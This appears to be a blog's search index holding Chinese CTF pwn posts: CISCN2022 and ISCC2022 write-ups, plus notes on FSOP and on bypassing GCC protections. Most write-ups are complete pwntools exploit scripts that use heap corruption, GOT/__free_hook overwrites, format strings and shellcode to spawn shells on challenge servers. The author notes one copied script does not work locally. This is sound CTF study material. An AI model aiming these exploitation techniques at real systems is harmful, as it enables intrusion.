<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CISCN2022初赛_pwn_部分wp</title>
    <url>/2022/07/03/CISCN2022-pwn-wp/</url>
    <content><![CDATA[<!-- pwn签到 -->

<span id="more"></span>

<h2 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a>login-nomal</h2><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序的流程是登录执行shellcode，shellcode需要通过检测，使用alpha3生成一个可见字符串shellcode。</p>
<p>生成的shellcode的内容为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>

<p>然后利用alpha3来将其转为可见字符形式，且这道题的shellcode的地址是存放在rdx中的，因此在使用alpha3时应该生成 call rdx。<a href="http://blog.rabb1t.xyz/2022/02/08/alphanumeric-shellcode/">alphanumeric_shellcode</a></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./login&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;59.110.105.63&#x27;</span>,<span class="number">23231</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.33.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">payload =<span class="string">&#x27;msg: ro0t \n&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;opt: 1\n&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;msg: &#x27;</span>+shellcode+<span class="string">&#x27; \n&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;opt: 2\n&#x27;</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>FSOP</title>
    <url>/2022/05/27/FSOP/</url>
    <content><![CDATA[<p>通过劫持 _IO_list_all 来伪造链表</p>
<span id="more"></span>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>_IO_list_all 中保存着 IO_FILE 结构体的链表，因此我们可以通过将伪造的 fake_FILE 插入其中来实施攻击。</p>
<p>由于链表通过 _chain 来链接，而 _chain 相对 IO_FILE 的偏移为 0x68，所以最常见的插入链表操作为：伪造一个 fake_FILE 并放入 0x60 大小的 smallbin 中，这个位置正好相对于 main_arena+88(&amp;bin[0]) 的偏移为 0x68，所以我们使用 unsortedbin_attack 将 IO_list_all 覆盖为 main_arena+88 即可。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>通过调用 _IO_flush_all_lockp，来刷新 _IO_list_all 链表中所有项的文件流，意味着会调用 vtable 中的 _IO_overflow。</p>
<p>调用 _IO_flush_all_lockp 的情况有：</p>
<ol>
<li>当 libc 执行 abort 流程时</li>
<li>当执行 exit 函数时</li>
<li>当执行流从 main 函数返回时</li>
</ol>
<p>而当 glibc 检测 memory corruption 时，会调用 abort() ，因此执行流程为:</p>
<ol>
<li>调用 abort()</li>
<li>调用 _IO_flush_all_lockp()</li>
<li>调用 JUMP_FIELD(_IO_overflow_t,__overflow)</li>
</ol>
<p><img src="https://ctf-wiki.org/pwn/linux/user-mode/io-file/figure/abort_routine.001.jpeg" alt="abort_routine"></p>
<p>如果我们将 system 作为伪造的 __overflow 指针，FILE 开头为 /bin/sh 就能获得 shell 了，或者直接使用 one_gadget。</p>
<p>然后当我们需要伪造一个 fake_FILE时，需要通过的检测为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>因此需要伪造的内容有 _mode&lt;=0, _IO_write_ptr&gt;_IO_write_base, IO_overflow=attack。</p>
<p>以上成员相对于 IO_FILE 首地址到偏移分别为 0xc0, 0x28, 0x20, 0xd8+24。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>FSOP</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>GCC保护机制</title>
    <url>/2022/03/08/GCC%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>简单介绍Linux下的GCC保护机制。</p>
<span id="more"></span>

<h2 id="地址随机化-PIE"><a href="#地址随机化-PIE" class="headerlink" title="地址随机化(PIE)"></a>地址随机化(PIE)</h2><p>在我们之前介绍的ROP攻击中，我们的主要目的是插入一个指向攻击代码的<strong>指针</strong>，这个代码可以是我们输入的(ret2shellcode)，也可以是程序中有的(ret2text、ret2libc)。</p>
<p>而当我们在同一个操作系统版本上运行同一个程序，即使是不同机器，栈的位置也是固定的，这使得栈地址非常容易被预测。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>栈随机化的思想就是使程序每次运行时，都使得栈的位置在变化。它的简单实现方式是：在程序开始时，在栈上分配一个指定的0~n个字节之间的随机大小空间，程序不使用这段空间，但它会导致程序执行时，后续的栈的位置发生了变化。而这个值n不能太大(太大浪费)，也不能太小(太小得到的随机化地址变化太少)，在32位linux中，地址大致分布在<code>0xff7fc59c</code>到<code>0xffffd09c</code>内,范围大约为2^23^；64位linux中，地址大致分布在<code>0x7fff000比98</code>到<code>0x7ffffffaa4a8</code>内，范围大约为2^32^。</p>
<p> 在Linux中，栈随机化是属于<strong>地址空间布局随机化</strong>技术中的一种(简称ASLR，address-space layout randomization)，而整个ASLR技术比较复杂。采用ASLR技术，使得每次运行时，除了栈外的程序中的其他段也都会被加载到内存中的不同区域，保护性更强。</p>
<h3 id="克服方法"><a href="#克服方法" class="headerlink" title="克服方法"></a>克服方法</h3><ul>
<li>泄露地址<ul>
<li>格式化字符串漏洞泄露栈上地址</li>
<li>构造ROPchain调用输出函数，将got表中存储的地址泄露</li>
</ul>
</li>
<li>若不能泄露地址，也能够通过暴力手段克服随机化保护<ul>
<li>若能够执行到我们写入的攻击代码，那么我们可以在有效的攻击代码前插入很长一段<code>nop</code>指令，然后只需要猜中其中一段指令的地址写入，那么在执行时就一定会执行到有效的攻击代码。这样的整个攻击代码称作”空操作雪橇”(“nop sled”)。</li>
</ul>
</li>
</ul>
<h2 id="栈破坏检测-Stack"><a href="#栈破坏检测-Stack" class="headerlink" title="栈破坏检测(Stack)"></a>栈破坏检测(Stack)</h2><p>栈破坏检测能有效的防止利用栈溢出漏洞来破坏栈上的结构</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>在栈帧中放入一段canary值，开启了栈破坏检测保护的程序，执行时会随机产生canary。在程序恢复寄存器状态和从函数返回前，程序都会检测canary是否被改变，如果是，那么程序异常结束。</p>
<p><em>canary：金丝雀。矿工下矿前会放一只鸟进去，能够提前预知意外。</em></p>
<h3 id="克服方法-1"><a href="#克服方法-1" class="headerlink" title="克服方法"></a>克服方法</h3><p>canary通常存放在栈帧上第一个内存地址中，可以通过调试进行寻找，它的标志是最后一字节为<code>0x00</code>，是为了防止输出下一个内存地址时将其泄露，且该位不属于被检测的部分。</p>
<ul>
<li>泄露canary，之后将其加入payload中的指定位置<ul>
<li>若程序能够输出我们写入的字符串，并且存在栈溢出漏洞，那么能够利用该漏洞将canary的最后一位给覆盖掉，再执行输出时能够泄露。</li>
<li>利用格式化字符串漏洞直接泄露</li>
</ul>
</li>
<li>若不能泄露canary，其实我们能够利用其机制来泄露其他信息，原理是：程序检测canary，实际上是通过调用<code>__stack_chk_fail</code>函数来实现的。在检测到canary异常时，会打印出<code>__libc_argv[0]</code>指针指向的内容，一般为程序名。那么我们利用漏洞，将argv[0]的内容改为其他信息的地址，在执行报错时就会泄露信息。</li>
</ul>
<h2 id="限制可执行代码区域-NX"><a href="#限制可执行代码区域-NX" class="headerlink" title="限制可执行代码区域(NX)"></a>限制可执行代码区域(NX)</h2><p>虚拟内存中，存在’页’的概念，一个页的大小一般是2048或4096个字节。典型的程序保护中，每个页都有一个标志，该标志的每位由硬件检测并指明该页的’可读’、’可写’、’可执行’权限。曾经<code>x86</code>体系将’可读’和’可执行’合并成一个标志位，而栈上数据一定是可读写的，所以会有向栈中写入攻击代码而被执行的危险。虽然有过很多机制，能够限制一些页的可读但是不可执行，却会带来严重的性能损失。</p>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>向内存中引入了’NX’(No-Execute)位，将’可读’和’可执行’权限分开来了，而页依旧由硬盘来检测，效率没有损失。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC2022_pwn方向部分writeup</title>
    <url>/2022/05/27/ISCC2022-pwn%E6%96%B9%E5%90%91writeup/</url>
    <content><![CDATA[<!-- 做的很开心。 -->

<span id="more"></span>

<h2 id="untidy-note"><a href="#untidy-note" class="headerlink" title="untidy_note"></a>untidy_note</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./untidy_note&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;123.57.69.203&#x27;</span>,<span class="number">7030</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./untidy_note&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;Your choose is:&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;the note size is:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;the size is:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Welcome to use untidy_note,Your name is:&quot;</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#14</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#15</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#16</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#17</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#18</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#19</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#20</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#21</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#22</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#23</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p16(<span class="number">0x421</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">main_arena=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">96</span></span><br><span class="line">libc_base=main_arena-<span class="number">0x3ebc40</span></span><br><span class="line">libc=elf.libc</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#23</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#23</span></span><br><span class="line">add(<span class="number">0x1f</span>)<span class="comment">#24</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">24</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./attachment-38&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;123.57.69.203&#x27;,5810)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./attachment-38&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sl(<span class="string">&quot;add&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Data: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sl(<span class="string">&quot;remove&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400896</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(elf.got[<span class="string">&quot;strncmp&quot;</span>])+p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">8</span>,p64(backdoor)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="sim-treasure"><a href="#sim-treasure" class="headerlink" title="sim_treasure"></a>sim_treasure</h2><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./sp1&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;123.57.69.203&#x27;,7010)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./sp1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;\%39$p&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main=<span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">241</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2libc</span>(<span class="params">func,func_addr,flag=<span class="number">1</span>,one_gadget_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="comment"># libc=ELF(libc_file)</span></span><br><span class="line">        libc=elf.libc</span><br><span class="line">        libc_base=func_addr-libc.sym[func]</span><br><span class="line">        sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">        __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">        libc=LibcSearcher(func,func_addr)</span><br><span class="line">        libc_base=func_addr-libc.dump(func)</span><br><span class="line">        sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">        environ=libc_base+libc.dump(<span class="string">&#x27;_environ&#x27;</span>)</span><br><span class="line">        __malloc_hook=libc_base+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">        __free_hook=libc_base+libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;libc_base&#x27;</span>:libc_base,<span class="string">&#x27;system&#x27;</span>:sys_addr,<span class="string">&#x27;binsh&#x27;</span>:binsh,<span class="string">&#x27;environ&#x27;</span>:environ,<span class="string">&#x27;__malloc_hook&#x27;</span>:__malloc_hook,<span class="string">&#x27;__free_hook&#x27;</span>:__free_hook&#125;</span><br><span class="line"></span><br><span class="line">libc=ret2libc(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_start_main)</span><br><span class="line">system=libc[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=fmtstr.fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system&#125;)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;/bin/bash\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Huge-Space"><a href="#Huge-Space" class="headerlink" title="Huge_Space"></a>Huge_Space</h2><p>这道题找师兄抄的，我本地打不通。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./attachment-33&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;123.57.69.203&#x27;,5330)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./attachment-33&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;+++&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Data: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;print&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">add(<span class="number">1</span>,-<span class="number">0x1280</span>,<span class="string">&quot;aaaaaa&quot;</span>)  <span class="comment"># 本地不可发送</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>,p8(<span class="number">1</span>)*<span class="number">0x70</span>+p64(elf.got[<span class="string">&quot;strncmp&quot;</span>]))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,p64(elf.plt[<span class="string">&quot;system&quot;</span>])[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="heapheap"><a href="#heapheap" class="headerlink" title="heapheap"></a>heapheap</h2><p>也是抄师兄的，不会 IO_FILE 捏。</p>
